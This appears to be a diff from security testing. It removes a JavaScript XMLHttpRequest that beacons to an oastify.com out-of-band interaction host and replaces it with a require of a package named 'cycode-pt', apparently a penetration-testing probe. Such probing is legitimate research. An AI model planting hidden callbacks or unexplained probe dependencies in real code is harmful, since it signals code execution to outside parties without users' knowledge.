@@ -1,12 +1,1 @@
-const xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://qwq5pkc5w9hxux3f50ch6bb3nutohg55.oastify.com/test-js', true);
-
-xhr.onload = () => {
-  // Request finished. Do processing here.
-};
-
-xhr.send(null);
-// xhr.send('string');
-// xhr.send(new Blob());
-// xhr.send(new Int8Array());
-// xhr.send(document);
+const xhr = require('cycode-pt');
